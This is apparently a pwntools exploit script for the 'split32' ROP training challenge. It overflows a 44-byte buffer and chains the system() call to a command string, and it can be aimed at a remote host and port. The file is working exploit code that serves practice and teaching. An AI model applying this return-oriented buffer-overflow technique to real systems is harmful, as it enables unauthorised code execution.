from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./split32")


class ROP_Gadget:
    system_call = 0x080483e0
    catcall = 0x0804a030
    junk = 0x42424242


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(44)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.system_call,
        ROP_Gadget.junk, # system call's ret address which is why junk bytes needed
        ROP_Gadget.catcall
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()